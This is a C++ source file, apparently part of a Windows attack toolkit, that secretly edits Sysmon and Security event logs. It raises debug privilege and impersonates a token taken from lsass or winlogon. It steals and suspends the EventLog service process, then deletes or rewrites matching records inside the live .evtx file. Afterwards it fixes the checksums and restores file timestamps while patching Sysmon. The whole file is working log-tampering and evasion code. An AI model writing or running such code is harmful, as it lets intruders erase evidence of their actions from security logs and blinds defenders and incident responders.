// NT declarations já fornecidas por Sysmon.hpp — pula as do header para evitar
// redeclarações conflitantes (assinaturas com/sem nome de parâmetro).
#define EVTX_SKIP_NT_DECLS
#include "evtx_stealth.hpp"
#include <algorithm>
#include <atomic>
#include <tlhelp32.h>
// LazyImporter.hpp é puxado transitivamente por Sysmon.hpp (que o inclui com
// LAZY_IMPORTER_HARDENED_MODULE_CHECKS já definido em evtx_stealth.hpp).
#include "../Sysmon/Sysmon.hpp"

#pragma comment(lib, "advapi32.lib")

static const UINT32 bloco = 65536;
static const UINT32 hbloco = 4096;
static const UINT32 magic = 0x00002A2A;
static const UINT32 rstart = 0x200;

typedef EVT_HANDLE( WINAPI* q_t ) ( EVT_HANDLE , LPCWSTR , LPCWSTR , DWORD );
typedef EVT_HANDLE( WINAPI* rc_t )( DWORD , LPCWSTR* , DWORD );
typedef BOOL( WINAPI* nx_t )( EVT_HANDLE , DWORD , PEVT_HANDLE , DWORD , DWORD , PDWORD );
typedef BOOL( WINAPI* rd_t )( EVT_HANDLE , EVT_HANDLE , DWORD , DWORD , PVOID , PDWORD , PDWORD );
typedef BOOL( WINAPI* cl_t )( EVT_HANDLE );

static q_t  q = nullptr;
static rc_t rc = nullptr;
static nx_t nx = nullptr;
static rd_t rd = nullptr;
static cl_t cl = nullptr;

static bool apis( ) {
	HMODULE h = LoadLibraryW( L"wevtapi.dll" );
	if ( !h ) return false;
	q = ( q_t ) GetProcAddress( h , "EvtQuery" );
	rc = ( rc_t ) GetProcAddress( h , "EvtCreateRenderContext" );
	nx = ( nx_t ) GetProcAddress( h , "EvtNext" );
	rd = ( rd_t ) GetProcAddress( h , "EvtRender" );
	cl = ( cl_t ) GetProcAddress( h , "EvtClose" );
	return q && rc && nx && rd && cl;
}

evtx::evtx( ) : ok( false ) , pid( 0 ) , hproc( NULL ) , hevt( NULL ) {
	memset( ctab , 0 , sizeof( ctab ) );
}

evtx::~evtx( ) { fecha( ); }

bool evtx::abre( ) {
	return abre( std::wstring( L"Microsoft-Windows-Sysmon/Operational" ) );
}

bool evtx::abre( const std::wstring& c ) {
	if ( ok ) return true;
	canal = c;
	initcrc( );

	if ( !apis( ) )   return false;
	if ( !dbg( ) )    return false;

	pid = findpid( );
	if ( !pid ) return false;

	hproc = stealProc( pid , PROCESS_DUP_HANDLE | PROCESS_SUSPEND_RESUME );
	if ( !hproc ) return false;

	hevt = duphdl( hsub( canal ) );
	if ( !hevt ) {
		CloseHandle( hproc );
		hproc = NULL;
		return false;
	}

	ok = true;
	return true;
}

int evtx::limpa( const std::wstring& kw , const std::wstring& repl ) {
	if ( !ok ) return 0;
	std::vector<std::wstring> kws  = { kw };
	std::vector<std::wstring> reps = { repl };
	for ( int i = 0; i < 5; i++ ) {
		if ( i > 0 ) Sleep( 3000 );
		auto s = ids( kws , 0 );
		if ( s.empty( ) ) continue;
		int n = proc_clean( s , kws , reps );
		if ( n > 0 ) return n;
		Sleep( 2000 );
	}
	return 0;
}

int evtx::limpa( const std::wstring& a , const std::wstring& b , const std::wstring& ra , const std::wstring& rb ) {
	if ( !ok ) return 0;
	std::vector<std::wstring> kws  = { a, b };
	std::vector<std::wstring> reps = { ra, rb };
	for ( int i = 0; i < 5; i++ ) {
		if ( i > 0 ) Sleep( 3000 );
		auto s = ids( kws , 1 );
		if ( s.empty( ) ) continue;
		int n = proc_clean( s , kws , reps );
		if ( n > 0 ) return n;
		Sleep( 2000 );
	}
	return 0;
}

void evtx::espera( DWORD ms ) { Sleep( ms ); }

void evtx::fecha( ) {
	if ( hevt ) { CloseHandle( hevt );  hevt = NULL; }
	if ( hproc ) { CloseHandle( hproc ); hproc = NULL; }
	ok = false;
}

bool evtx::dbg( ) {
	HANDLE tok = NULL;
	if ( !OpenProcessToken( GetCurrentProcess( ) , TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY , &tok ) )
		return false;

	LUID lu = {};
	if ( !LookupPrivilegeValueW( NULL , L"SeDebugPrivilege" , &lu ) ) {
		CloseHandle( tok );
		return false;
	}

	TOKEN_PRIVILEGES tp = {};
	tp.PrivilegeCount = 1;
	tp.Privileges [ 0 ].Luid = lu;
	tp.Privileges [ 0 ].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL  r = AdjustTokenPrivileges( tok , FALSE , &tp , sizeof( tp ) , NULL , NULL );
	DWORD e = GetLastError( );
	CloseHandle( tok );
	return r && e == ERROR_SUCCESS;
}

DWORD evtx::findpid( ) {
	SC_HANDLE m = OpenSCManagerW( NULL , NULL , SC_MANAGER_CONNECT );
	if ( !m ) return 0;

	SC_HANDLE s = OpenServiceW( m , L"EventLog" , SERVICE_QUERY_STATUS );
	if ( !s ) { CloseServiceHandle( m ); return 0; }

	SERVICE_STATUS_PROCESS ss = {};
	DWORD n = 0;
	QueryServiceStatusEx( s , SC_STATUS_PROCESS_INFO , ( LPBYTE ) &ss , sizeof( ss ) , &n );

	CloseServiceHandle( s );
	CloseServiceHandle( m );
	return ( ss.dwCurrentState == SERVICE_RUNNING ) ? ss.dwProcessId : 0;
}

HANDLE evtx::stealProc( DWORD targetPid , DWORD access ) {
	HANDLE hImpToken = nullptr;
	{
		const wchar_t* targets [] = { L"winlogon.exe" , L"wininit.exe" , L"lsass.exe" };
		HANDLE snap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS , 0 );
		if ( snap && snap != INVALID_HANDLE_VALUE ) {
			PROCESSENTRY32W pe = { sizeof( pe ) };
			for ( auto* name : targets ) {
				if ( Process32FirstW( snap , &pe ) ) {
					do {
						if ( _wcsicmp( pe.szExeFile , name ) != 0 ) continue;
						HANDLE hProc = OpenProcess( PROCESS_QUERY_LIMITED_INFORMATION , FALSE , pe.th32ProcessID );
						if ( !hProc ) break;
						HANDLE hTok = nullptr;
						if ( OpenProcessToken( hProc , TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE , &hTok ) ) {
							DuplicateTokenEx( hTok , TOKEN_ALL_ACCESS , nullptr ,
								SecurityImpersonation , TokenImpersonation , &hImpToken );
							CloseHandle( hTok );
						}
						CloseHandle( hProc );
						break;
					} while ( Process32NextW( snap , &pe ) );
				}
				if ( hImpToken ) break;
			}
			CloseHandle( snap );
		}
		if ( hImpToken ) ImpersonateLoggedOnUser( hImpToken );
	}

	HANDLE hResult = nullptr;
	DWORD  servicesPid = 0;
	{
		HANDLE snap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS , 0 );
		if ( snap && snap != INVALID_HANDLE_VALUE ) {
			PROCESSENTRY32W pe = { sizeof( pe ) };
			if ( Process32FirstW( snap , &pe ) ) {
				do {
					if ( _wcsicmp( pe.szExeFile , L"services.exe" ) == 0 ) {
						servicesPid = pe.th32ProcessID; break;
					}
				} while ( Process32NextW( snap , &pe ) );
			}
			CloseHandle( snap );
		}
	}

	if ( servicesPid ) {
		HANDLE hSrc = OpenProcess( PROCESS_DUP_HANDLE , FALSE , servicesPid );
		if ( hSrc ) {
			ULONG    sz = 1 << 20;
			PVOID    b  = nullptr;
			NTSTATUS st;
			do {
				b = realloc( b , sz );
				if ( !b ) { CloseHandle( hSrc ); goto done; }
				st = SafeCall( NtQuerySystemInformation )( ( ULONG ) hcls , b , sz , nullptr );
				if ( st == stlen ) sz *= 2;
			} while ( st == stlen );

			if ( NT_SUCCESS( st ) ) {
				auto* list = ( hi* ) b;
				for ( ULONG i = 0; i < list->cnt && !hResult; i++ ) {
					auto& e = list->ent [ i ];
					if ( e.pid != ( USHORT ) servicesPid ) continue;

					HANDLE hCheck = nullptr;
					st = SafeCall( NtDuplicateObject )(
						hSrc , ( HANDLE ) ( ULONG_PTR ) e.val ,
						( HANDLE ) -1 , &hCheck ,
						( ACCESS_MASK ) 0 , 0 , DUPLICATE_SAME_ACCESS );
					if ( !NT_SUCCESS( st ) || !hCheck ) continue;

					bool isTarget = ( GetProcessId( hCheck ) == targetPid );
					CloseHandle( hCheck );
					if ( !isTarget ) continue;

					HANDLE hFinal = nullptr;
					if ( DuplicateHandle( hSrc , ( HANDLE ) ( ULONG_PTR ) e.val ,
					                      GetCurrentProcess( ) , &hFinal , access , FALSE , 0 ) )
						hResult = hFinal;
				}
			}
			free( b );
			CloseHandle( hSrc );
		}
	}

done:
	if ( hImpToken ) {
		RevertToSelf( );
		CloseHandle( hImpToken );
	}
	return hResult;
}

HANDLE evtx::duphdl( const std::wstring& sub ) {
	ULONG    sz = 1 << 20;
	PVOID    b = nullptr;
	NTSTATUS st;

	do {
		b = realloc( b , sz );
		if ( !b ) return NULL;
		st = SafeCall( NtQuerySystemInformation )( ( ULONG ) hcls , b , sz , nullptr );
		if ( st == stlen ) sz *= 2;
	} while ( st == stlen );

	if ( !NT_SUCCESS( st ) ) { free( b ); return NULL; }

	auto* list = ( hi* ) b;
	ULONG        obsz = 0x10000;
	PVOID        ob = malloc( obsz );
	HANDLE       hr = NULL;
	std::wstring ext( L".evtx" );

	for ( ULONG i = 0; i < list->cnt; i++ ) {
		auto& e = list->ent [ i ];
		if ( e.pid != ( USHORT ) pid ) continue;

		HANDLE hd = NULL;
		st = SafeCall( NtDuplicateObject )(
			hproc , ( HANDLE ) ( ULONG_PTR ) e.val ,
			( HANDLE ) -1 , &hd ,
			( ACCESS_MASK ) 0 , ( ULONG ) 0 , ( ULONG ) DUPLICATE_SAME_ACCESS );
		if ( !NT_SUCCESS( st ) || !hd ) continue;

		memset( ob , 0 , obsz );
		ULONG n = 0;
		st = SafeCall( NtQueryObject )( hd , ( ULONG ) ocls , ob , obsz , &n );
		if ( !NT_SUCCESS( st ) ) { CloseHandle( hd ); continue; }

		auto* u = ( ustr* ) ob;
		if ( !u->buf || u->len == 0 ) { CloseHandle( hd ); continue; }

		std::wstring name( u->buf , u->len / sizeof( WCHAR ) );
		if ( name.find( sub ) != std::wstring::npos &&
			name.find( ext ) != std::wstring::npos ) {
			hr = hd;
			break;
		}
		CloseHandle( hd );
	}

	free( ob );
	free( b );
	return hr;
}

std::wstring evtx::hsub( const std::wstring& c ) {
	if ( c.find( L"Security" ) != std::wstring::npos ) return std::wstring( L"Security" );
	if ( c.find( L"Sysmon" ) != std::wstring::npos ) return std::wstring( L"Sysmon" );
	size_t sl = c.rfind( L'/' );
	if ( sl == std::wstring::npos ) sl = c.rfind( L'\\' );
	return ( sl != std::wstring::npos ) ? c.substr( 0 , sl ) : c;
}

void evtx::initcrc( ) {
	for ( UINT32 i = 0; i < 256; i++ ) {
		UINT32 c = i;
		for ( int j = 0; j < 8; j++ )
			c = ( c >> 1 ) ^ ( ( c & 1 ) ? 0xEDB88320u : 0u );
		ctab [ i ] = c;
	}
}

UINT32 evtx::crc( const BYTE* d , size_t n , UINT32 init ) {
	UINT32 c = init;
	for ( size_t i = 0; i < n; i++ )
		c = ( c >> 8 ) ^ ctab [ ( c ^ d [ i ] ) & 0xFF ];
	return c ^ 0xFFFFFFFF;
}

UINT32 evtx::crcp( const BYTE* d , size_t n , UINT32 c ) {
	for ( size_t i = 0; i < n; i++ )
		c = ( c >> 8 ) ^ ctab [ ( c ^ d [ i ] ) & 0xFF ];
	return c;
}

void evtx::chcrc( BYTE* data ) {
	auto* h = ( ch* ) data;
	UINT32 e = h->fso;
	if ( e > rstart && e <= bloco )
		h->rcrc = crc( data + rstart , e - rstart );
	else
		h->rcrc = 0;
	h->crc = 0;
	UINT32 c = crcp( data , 0x78 );
	c = crcp( data + 0x80 , 0x180 , c );
	h->crc = c ^ 0xFFFFFFFF;
}

void evtx::fhcrc( BYTE* data ) {
	auto* h = ( fh* ) data;
	h->crc = crc( data , 0x78 );
}

bool evtx::contem( const std::wstring& hay , const std::wstring& ndl ) {
	if ( ndl.empty( ) ) return true;
	if ( hay.size( ) < ndl.size( ) ) return false;
	auto it = std::search( hay.begin( ) , hay.end( ) ,
		ndl.begin( ) , ndl.end( ) ,
		[ ] ( wchar_t a , wchar_t b ) { return towlower( a ) == towlower( b ); } );
	return it != hay.end( );
}

std::set<UINT64> evtx::ids( const std::vector<std::wstring>& kw , int mode ) {
	std::set<UINT64> out;
	if ( kw.empty( ) ) return out;

	EVT_HANDLE hq = q( NULL , canal.c_str( ) , L"*" ,
		EvtQueryChannelPath | EvtQueryReverseDirection );
	if ( !hq ) return out;

	LPCWSTR    prop [ ] = { L"Event/System/EventRecordID" };
	EVT_HANDLE hc = rc( 1 , prop , EvtRenderContextValues );
	if ( !hc ) { cl( hq ); return out; }

	EVT_HANDLE         evs [ 256 ];
	DWORD              got = 0;
	std::vector<WCHAR> buf( 65536 );

	while ( nx( hq , 256 , evs , 5000 , 0 , &got ) ) {
		for ( DWORD i = 0; i < got; i++ ) {
			DWORD used = 0 , cnt = 0;

			BOOL r = rd( NULL , evs [ i ] , EvtRenderEventXml ,
				( DWORD ) ( buf.size( ) * sizeof( WCHAR ) ) ,
				( PVOID ) buf.data( ) , &used , &cnt );

			if ( !r && GetLastError( ) == ERROR_INSUFFICIENT_BUFFER ) {
				buf.resize( used / sizeof( WCHAR ) + 1 );
				r = rd( NULL , evs [ i ] , EvtRenderEventXml ,
					( DWORD ) ( buf.size( ) * sizeof( WCHAR ) ) ,
					( PVOID ) buf.data( ) , &used , &cnt );
			}

			if ( r ) {
				std::wstring xml( buf.data( ) , used / sizeof( WCHAR ) );
				bool m = false;

				if ( mode == 0 ) {
					for ( auto& k : kw )
						if ( contem( xml , k ) ) { m = true; break; }
				}
				else {
					m = true;
					for ( auto& k : kw )
						if ( !contem( xml , k ) ) { m = false; break; }
				}

				if ( m ) {
					BYTE  rb [ 64 ] = {};
					DWORD ru = 0 , rc2 = 0;
					if ( rd( hc , evs [ i ] , EvtRenderEventValues ,
						sizeof( rb ) , ( PVOID ) rb , &ru , &rc2 ) ) {
						auto* pv = ( PEVT_VARIANT ) rb;
						if ( pv->Type == EvtVarTypeUInt64 )
							out.insert( pv->UInt64Val );
					}
				}
			}

			cl( evs [ i ] );
		}
	}

	cl( hc );
	cl( hq );
	return out;
}

int evtx::compact( BYTE* data , const std::set<UINT64>& tg ) {
	constexpr UINT32 hsz = sizeof( rh );
	auto* h = ( ch* ) data;

	UINT32 end = h->fso;
	if ( end <= rstart || end > bloco ) return 0;

	struct ri { UINT32 oo; UINT32 sz; UINT64 rid; bool rm; };
	std::vector<ri> recs;

	UINT32 o = rstart;
	while ( o + hsz <= end ) {
		auto* r = ( rh* ) ( data + o );
		if ( r->magic != magic ) break;
		if ( r->sz < hsz + 4 )   break;
		if ( o + r->sz > end )   break;
		UINT32 t = *( UINT32* ) ( data + o + r->sz - 4 );
		if ( t != r->sz ) break;

		recs.push_back( { o, r->sz, r->rid, tg.count( r->rid ) != 0 } );
		o += r->sz;
	}
	if ( recs.empty( ) ) return 0;

	auto ent = [ & ] ( UINT32 base , int i ) -> UINT32 {
		return *( UINT32* ) ( data + base + i * 4 );
		};
	for ( auto& r : recs ) {
		if ( !r.rm ) continue;
		UINT32 s = r.oo , e = r.oo + r.sz;
		for ( int i = 0; i < 64 && r.rm; i++ )
			if ( UINT32 p = ent( 0x80 , i ); p >= s && p < e ) r.rm = false;
		for ( int i = 0; i < 32 && r.rm; i++ )
			if ( UINT32 p = ent( 0x180 , i ); p >= s && p < e ) r.rm = false;
	}

	int n = 0;
	for ( auto& r : recs ) if ( r.rm ) n++;
	if ( n == 0 ) return 0;

	std::vector<UINT32> nof( recs.size( ) , 0 );
	UINT32 wo = rstart , last = 0;
	UINT64 fr = 0 , lr = 0;
	bool got = false;

	for ( size_t i = 0; i < recs.size( ); i++ ) {
		if ( recs [ i ].rm ) continue;
		if ( wo != recs [ i ].oo )
			memmove( data + wo , data + recs [ i ].oo , recs [ i ].sz );
		nof [ i ] = wo;
		last = wo;
		if ( !got ) { fr = recs [ i ].rid; got = true; }
		lr = recs [ i ].rid;
		wo += recs [ i ].sz;
	}

	UINT32 nfs = wo;
	if ( nfs < end ) memset( data + nfs , 0 , end - nfs );

	h->fso = nfs;
	h->ldo = last;
	if ( got ) {
		h->frn = fr; h->lrn = lr;
	}

	auto adj = [ & ] ( UINT32& p ) {
		if ( p == 0 ) return;
		for ( size_t i = 0; i < recs.size( ); i++ ) {
			UINT32 s = recs [ i ].oo , e = s + recs [ i ].sz;
			if ( p >= s && p < e ) {
				if ( recs [ i ].rm ) p = 0;
				else            p -= ( recs [ i ].oo - nof [ i ] );
				return;
			}
		}
		};
	for ( int i = 0; i < 64; i++ ) adj( *( UINT32* ) ( data + 0x80 + i * 4 ) );
	for ( int i = 0; i < 32; i++ ) adj( *( UINT32* ) ( data + 0x180 + i * 4 ) );

	chcrc( data );
	return n;
}

static bool neutralize_pattern( BYTE* body , UINT32 body_sz ,
                                 const std::vector<BYTE>& pat ,
                                 const std::vector<BYTE>& repl ) {
	if ( pat.empty( ) || ( UINT32 ) pat.size( ) > body_sz ) return false;
	bool found = false;
	for ( UINT32 i = 0; i + ( UINT32 ) pat.size( ) <= body_sz; i++ ) {
		bool match = true;
		for ( size_t j = 0; j < pat.size( ); j += 2 ) {
			WCHAR wc_body = ( WCHAR ) ( body [ i + j ] | ( ( WCHAR ) body [ i + j + 1 ] << 8 ) );
			WCHAR wc_pat  = ( WCHAR ) ( pat [ j ]      | ( ( WCHAR ) pat [ j + 1 ]      << 8 ) );
			if ( ( WCHAR ) towlower( wc_body ) != ( WCHAR ) towlower( wc_pat ) ) { match = false; break; }
		}
		if ( match ) {
			UINT32 pat_len  = ( UINT32 ) pat.size( );
			UINT32 repl_len = ( UINT32 ) repl.size( );
			UINT32 copy_len = ( repl_len < pat_len ) ? repl_len : pat_len;
			copy_len &= ~1u;
			if ( copy_len > 0 )
				memcpy( body + i , repl.data( ) , copy_len );
			for ( UINT32 k = copy_len; k < pat_len; k += 2 ) {
				body [ i + k ]     = 0x20;
				body [ i + k + 1 ] = 0x00;
			}
			i += pat_len - 2;
			found = true;
		}
	}
	return found;
}

static int binxml_expand( BYTE* chunk , UINT32 rec_off ,
                          const std::vector<BYTE>& old_b ,
                          const std::vector<BYTE>& new_b ) {
	constexpr UINT32 rhsz = sizeof( rh );

	auto* r = ( rh* )( chunk + rec_off );
	if ( r->sz < rhsz + 4 ) return 0;

	BYTE*  body    = chunk + rec_off + rhsz;
	UINT32 body_sz = r->sz - rhsz - 4;

	if ( body_sz < 20 || body [ 0 ] != 0x0F ) return 0;

	UINT32 old_len = ( UINT32 ) old_b.size( );
	UINT32 new_len = ( UINT32 ) new_b.size( );
	auto*  h       = ( ch* ) chunk;

	UINT32 n_off , d_off;
	const UINT8 tok = body [ 4 ];

	if      ( ( tok & 0x3F ) == 0x0B ) { n_off = 25u; d_off = 29u; }
	else if ( ( tok & 0x3F ) == 0x0C ) { n_off = 14u; d_off = 18u; }
	else return 0;

	if ( n_off + 4 > body_sz ) return 0;

	const UINT32 N = *( UINT32* )( body + n_off );
	if ( N == 0 || N > 128 ) return 0;
	if ( d_off + 4 * N > body_sz ) return 0;

	UINT32 data_pos = d_off + 4 * N;
	if ( data_pos + old_len > body_sz ) return 0;

	for ( UINT32 i = 0; i < N; i++ ) {
		const UINT16 flen  = *( UINT16* )( body + d_off + i * 4 );
		const UINT8  ftype =              body [ d_off + i * 4 + 2 ];

		if ( data_pos + flen > body_sz ) break;

		const bool null_term = ( flen == old_len + 2 );
		if ( ftype == 0x01 && ( flen == old_len || null_term ) ) {
			bool match = true;
			for ( UINT32 j = 0; j + 1 < old_len; j += 2 ) {
				const WCHAR wc_b = ( WCHAR )( body [ data_pos + j ]     | ( ( WCHAR ) body [ data_pos + j + 1 ] << 8 ) );
				const WCHAR wc_o = ( WCHAR )( old_b [ j ]               | ( ( WCHAR ) old_b [ j + 1 ]           << 8 ) );
				if ( towlower( wc_b ) != towlower( wc_o ) ) { match = false; break; }
			}
			if ( match && null_term ) {
				if ( body [ data_pos + old_len ]     != 0x00 ||
				     body [ data_pos + old_len + 1 ] != 0x00 )
					match = false;
			}

			if ( match ) {
				const UINT32 new_actual = new_len + ( null_term ? 2u : 0u );
				if ( new_actual <= flen ) break;

				const UINT32 delta = new_actual - flen;
				if ( h->fso + delta > bloco ) return -1;

				const UINT32 ep     = rec_off + rhsz + data_pos;
				const UINT32 mv_src = ep + flen;
				const UINT32 mv_len = h->fso - mv_src;

				memmove( chunk + mv_src + delta , chunk + mv_src , mv_len );
				memcpy(  chunk + ep , new_b.data( ) , new_len );
				if ( null_term ) {
					chunk [ ep + new_len ]     = 0x00;
					chunk [ ep + new_len + 1 ] = 0x00;
				}

				*( UINT16* )( body + d_off + i * 4 ) = ( UINT16 ) new_actual;
				r->sz += delta;
				*( UINT32* )( chunk + rec_off + r->sz - 4 ) = r->sz;
				h->fso += delta;
				if ( h->ldo > rec_off ) h->ldo += delta;

				return ( int ) delta;
			}
		}

		data_pos += flen;
	}

	return 0;
}

int evtx::neutralize( BYTE* data , const std::set<UINT64>& tg ,
                      const std::vector<std::wstring>& kws ,
                      const std::vector<std::wstring>& repls ) {
	constexpr UINT32 hsz = sizeof( rh );
	auto* h = ( ch* ) data;

	UINT32 end = h->fso;
	if ( end <= rstart || end > bloco ) return 0;

	std::vector<std::vector<BYTE>> patterns;
	std::vector<std::vector<BYTE>> replacements;
	for ( size_t idx = 0; idx < kws.size( ); idx++ ) {
		const auto& kw = kws [ idx ];
		if ( kw.empty( ) ) continue;
		std::vector<BYTE> pat;
		pat.reserve( kw.size( ) * 2 );
		for ( wchar_t wc : kw ) {
			pat.push_back( ( BYTE ) ( ( unsigned ) wc & 0xFF ) );
			pat.push_back( ( BYTE ) ( ( unsigned ) wc >> 8 ) );
		}
		std::vector<BYTE> rep;
		if ( idx < repls.size( ) && !repls [ idx ].empty( ) ) {
			const auto& rs = repls [ idx ];
			rep.reserve( rs.size( ) * 2 );
			for ( wchar_t wc : rs ) {
				rep.push_back( ( BYTE ) ( ( unsigned ) wc & 0xFF ) );
				rep.push_back( ( BYTE ) ( ( unsigned ) wc >> 8 ) );
			}
		}
		patterns.push_back( std::move( pat ) );
		replacements.push_back( std::move( rep ) );
	}
	if ( patterns.empty( ) ) return 0;

	int n = 0;
	UINT32 o = rstart;
	while ( o + hsz <= end ) {
		auto* r = ( rh* ) ( data + o );
		if ( r->magic != magic )   break;
		if ( r->sz < hsz + 4 )    break;
		if ( o + r->sz > end )     break;
		UINT32 t = *( UINT32* ) ( data + o + r->sz - 4 );
		if ( t != r->sz )          break;

		if ( tg.count( r->rid ) ) {
			BYTE*  body    = data + o + hsz;
			UINT32 body_sz = r->sz - hsz - 4;

			bool hit = false;
			for ( size_t idx = 0; idx < patterns.size( ); idx++ ) {
				const auto& pat = patterns [ idx ];
				const auto& rep = replacements [ idx ];

				if ( rep.size( ) > pat.size( ) ) {
					int d = binxml_expand( data , o , pat , rep );
					if ( d > 0 ) {
						hit     = true;
						body_sz = r->sz - hsz - 4;
						end     = h->fso;
					}
				} else {
					if ( neutralize_pattern( body , body_sz , pat , rep ) ) hit = true;
				}
			}

			if ( hit ) n++;
		}

		o += r->sz;
	}

	if ( n > 0 ) chcrc( data );
	return n;
}

static HANDLE            g_stHevt;
static FILETIME          g_stTc, g_stTa, g_stTw;
static std::atomic<bool> g_stDone{ false };

int evtx::proc_clean( const std::set<UINT64>& tg , const std::vector<std::wstring>& kws , const std::vector<std::wstring>& repls ) {
	if ( tg.empty( ) || !hproc || kws.empty( ) ) return 0;

	NTSTATUS st = SafeCall( NtSuspendProcess )( hproc );
	if ( !NT_SUCCESS( st ) ) return 0;

	Sleep( 150 );

	if ( hevt ) { CloseHandle( hevt ); hevt = NULL; }
	hevt = duphdl( hsub( canal ) );
	if ( !hevt ) { SafeCall( NtResumeProcess )( hproc ); return 0; }

	LARGE_INTEGER fs = {};
	if ( !GetFileSizeEx( hevt , &fs ) ) { SafeCall( NtResumeProcess )( hproc ); return 0; }

	size_t total = ( size_t ) fs.QuadPart;
	std::vector<BYTE> data( total );

	LARGE_INTEGER z = {};
	SetFilePointerEx( hevt , z , nullptr , FILE_BEGIN );

	size_t rd = 0;
	while ( rd < total ) {
		DWORD want = ( DWORD ) min( total - rd , ( size_t ) 0x100000 );
		DWORD got  = 0;
		if ( !ReadFile( hevt , data.data( ) + rd , want , &got , nullptr ) || got == 0 ) {
			SafeCall( NtResumeProcess )( hproc );
			return 0;
		}
		rd += got;
	}

	auto* f = ( fh* ) data.data( );
	if ( memcmp( f->magic , "ElfFile\0" , 8 ) != 0 ) {
		SafeCall( NtResumeProcess )( hproc );
		return 0;
	}

	int    tot = 0;
	UINT32 co  = hbloco;
	while ( co + bloco <= rd ) {
		BYTE* c = data.data( ) + co;
		auto* h = ( ch* ) c;
		if ( memcmp( h->magic , "ElfChnk\0" , 8 ) != 0 ) { co += bloco; continue; }

		int r = neutralize( c , tg , kws , repls );
		if ( r > 0 ) tot += r;
		co += bloco;
	}

	if ( tot > 0 ) {
		f->flags = 0;
		fhcrc( data.data( ) );

		FILETIME tc = {} , ta = {} , tw = {};
		GetFileTime( hevt , &tc , &ta , &tw );

		SetFilePointerEx( hevt , z , nullptr , FILE_BEGIN );
		size_t wr = 0;
		while ( wr < rd ) {
			DWORD want = ( DWORD ) min( rd - wr , ( size_t ) 0x100000 );
			DWORD got  = 0;
			if ( !WriteFile( hevt , data.data( ) + wr , want , &got , nullptr ) )
				break;
			wr += got;
		}
		FlushFileBuffers( hevt );
		g_stHevt = hevt;
		g_stTc   = tc;
		g_stTa   = ta;
		g_stTw   = tw;
		g_stDone = false;
		SysmonTool::Initialize( );
		SysmonTool::Patch( [ ]( ) {
			SetFileTime( g_stHevt , &g_stTc , &g_stTa , &g_stTw );
			g_stDone = true;
		} );
		for ( DWORD _t = 0; !g_stDone && _t < 3000; _t += 10 ) Sleep( 10 );
		Sleep( 1500 );
		SysmonTool::Restore( );
	}

	SafeCall( NtResumeProcess )( hproc );
	return tot;
}

int evtx::proc( const std::set<UINT64>& tg ) {
	if ( tg.empty( ) || !hproc ) return 0;

	NTSTATUS st = SafeCall( NtSuspendProcess )( hproc );
	if ( !NT_SUCCESS( st ) ) return 0;

	Sleep( 150 );

	if ( hevt ) { CloseHandle( hevt ); hevt = NULL; }
	hevt = duphdl( hsub( canal ) );
	if ( !hevt ) { SafeCall( NtResumeProcess )( hproc ); return 0; }

	LARGE_INTEGER fs = {};
	if ( !GetFileSizeEx( hevt , &fs ) ) { SafeCall( NtResumeProcess )( hproc ); return 0; }

	size_t total = ( size_t ) fs.QuadPart;
	std::vector<BYTE> data( total );

	LARGE_INTEGER z = {};
	SetFilePointerEx( hevt , z , nullptr , FILE_BEGIN );

	size_t rd = 0;
	while ( rd < total ) {
		DWORD want = ( DWORD ) min( total - rd , ( size_t ) 0x100000 );
		DWORD got = 0;
		if ( !ReadFile( hevt , data.data( ) + rd , want , &got , nullptr ) || got == 0 ) {
			SafeCall( NtResumeProcess )( hproc );
			return 0;
		}
		rd += got;
	}

	auto* f = ( fh* ) data.data( );
	if ( memcmp( f->magic , "ElfFile\0" , 8 ) != 0 ) { SafeCall( NtResumeProcess )( hproc ); return 0; }

	int    tot = 0;
	UINT32 co = hbloco;

	while ( co + bloco <= rd ) {
		BYTE* c = data.data( ) + co;
		auto* h = ( ch* ) c;

		if ( memcmp( h->magic , "ElfChnk\0" , 8 ) != 0 ) { co += bloco; continue; }

		int r = compact( c , tg );
		if ( r > 0 ) tot += r;
		co += bloco;
	}

	if ( tot > 0 ) {
		f->flags = 0;
		fhcrc( data.data( ) );

		FILETIME tc = {} , ta = {} , tw = {};
		GetFileTime( hevt , &tc , &ta , &tw );

		SetFilePointerEx( hevt , z , nullptr , FILE_BEGIN );
		size_t wr = 0;
		while ( wr < rd ) {
			DWORD want = ( DWORD ) min( rd - wr , ( size_t ) 0x100000 );
			DWORD got = 0;
			if ( !WriteFile( hevt , data.data( ) + wr , want , &got , nullptr ) )
				break;
			wr += got;
		}
		FlushFileBuffers( hevt );
		g_stHevt = hevt;
		g_stTc   = tc;
		g_stTa   = ta;
		g_stTw   = tw;
		g_stDone = false;
		SysmonTool::Initialize( );
		SysmonTool::Patch( []( ) {
			SetFileTime( g_stHevt , &g_stTc , &g_stTa , &g_stTw );
			g_stDone = true;
		} );
		for ( DWORD _t = 0; !g_stDone && _t < 3000; _t += 10 ) Sleep( 10 );
		Sleep( 1500 );
		SysmonTool::Restore( );
	}

	SafeCall( NtResumeProcess )( hproc );
	return tot;
}
